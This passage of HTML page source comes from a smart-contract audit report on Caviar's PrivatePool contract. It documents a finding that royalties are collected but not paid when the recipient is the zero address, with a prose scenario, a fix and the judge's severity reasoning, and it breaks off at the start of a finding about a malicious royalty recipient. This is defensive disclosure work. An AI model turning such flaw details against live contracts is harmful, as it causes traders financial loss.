class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// add the royalty fee amount to the net input aount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// transfer the royalty fee to the recipient if it&#39;s greater than 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// emit the buy event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// transfer each nft from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// calculate the sale price (assume it&#39;s the same for each NFT even if weights differ)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// tally the royalty fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// transfer the royalty fee to the recipient if it&#39;s greater than 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// subtract the royalty fee amount from the net output amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// transfer ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// transfer base tokens to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// if the protocol fee is set then pay the protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">), </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>It should be noted that while calculating <code>royaltyFeeAmount</code> the the <code>recipient</code> address returned from <code>_getRoyalty</code> function is ignored and the returned <code>royaltyFee</code> is added to the <code>royaltyFeeAmount</code>. This cumulative royalty amount is then collected from the trader.</p>\n<p>However while performing the actual royalty transfer to the royalty recipient the returned <code>recipient</code> address is validated to not be equal to 0. The royalty is only paid when the <code>recipient</code> address is non-zero.</p>\n<p>This inconsistency between royalty collection and royalty distribution can cause loss of funds to the traders. In the cases when <code>royaltyFee</code> is non-zero but <code>recipient</code> address is zero, the fee will be collected from traders but won’t be distributed to royalty recipient. Hence causing loss of funds to the traders.</p>\n<p>As the creation of private pools is open to everyone, the likelihood of this vulnerability is high.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider this scenario:</p>\n<ul>\n<li>A buyer initiates the <code>buy</code> call for an NFT.</li>\n<li>The <code>PrivatePool.buy</code> function queries the <code>_getRoyalty</code> function which returns 10 WETH as the <code>royaltyFee</code> and <code>0x00</code> address as the royalty recipient.</li>\n<li>This 10 WETH value will be added to the <code>royaltyFeeAmount</code> amount and will be collected from the buyer.</li>\n<li>But since the recipient address is <code>0x00</code>, the 10 WETH royalty amount will not be distributed.</li>\n<li>The 10 WETH amount won’t be returned to the buyer either. It just simply stays inside the pool contract.</li>\n<li>The buyer here suffered loss of 10 WETH.</li>\n</ul>\n<p>A similar scenario is possible for the NFT <code>sell</code> flow.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider collecting royalty amount from traders only when the royalty recipient is non-zero.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1520049550\">outdoteth (Caviar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/11\">https://github.com/outdoteth/caviar-private-pools/pull/11</a>.</p>\n<p>Proposed fix is to only increment the total royalty fee amount in sell() and buy() when the recipient address is not zero.</p>\n<p>In sell():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// transfer the royalty fee to the recipient if it&#39;s greater than 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// tally the royalty fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In buy():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// add the royalty fee to the total royalty fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1527422591\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a logic discrepancy, a non-zero royalty would be removed from total paid, but wouldn’t be transferred.</p>\n<p>The behaviour is inconsistent, so the finding is valid.</p>\n<p>Technically the tokens will be left in the pool, meaning the owner will be able to retrieve them.</p>\n<p>Factually this would end up being an additional cost to the buyer, more so than a loss of funds.</p>\n<p>Because the finding shows an inconsistent behavior, that doesn’t cause a loss of funds beside the royalty fee, I believe Medium Severity to be the most appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1534384118\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>At this time, with the information that I have available, the finding highlights the fact that the royalties may be paid, but not transferred to the recipient if the recipient is the address(0).</p>\n<p>While the OZ implementation addresses this, I don’t believe older implementations would.</p>\n<p>I also have to concede that having non-zero royalties sent to address(0) should not be common.</p>\n<p>However, I maintain that the issue with the finding is not the address(0) per-se which would have been rated as Low, but the fact that in that case the behaviour is inconsistent with other cases, and that will cause a cost to the payer although the royalties will not be forwarded.</p>\n<p>By contrast, if the royalties were sent to address(0) I would be arguing around the idea that the royalty recipient may wish to burn such tokens and that would have been within their rights to do so.</p>\n<p>For the reasons above, am maintaining Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-malicious-royalty-recipient-can-steal-excess-eth-from-buy-orders\" style=\"position:relative;\"><a href=\"#m-09-malicious-royalty-recipient-can-steal-excess-eth-from-buy-orders\" aria-label=\"m 09 malicious royalty recipient can steal excess eth from buy orders permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/569\">[M-09] Malicious royalty recipient can steal excess eth from buy orders</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/569\">Voyvoda</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/990\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/938\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/765\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/752\">Kenshin</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/688\">philogy</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/500\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/375\">teawaterwire</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/205\">Ruhum</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268</a></p>\n<p><a 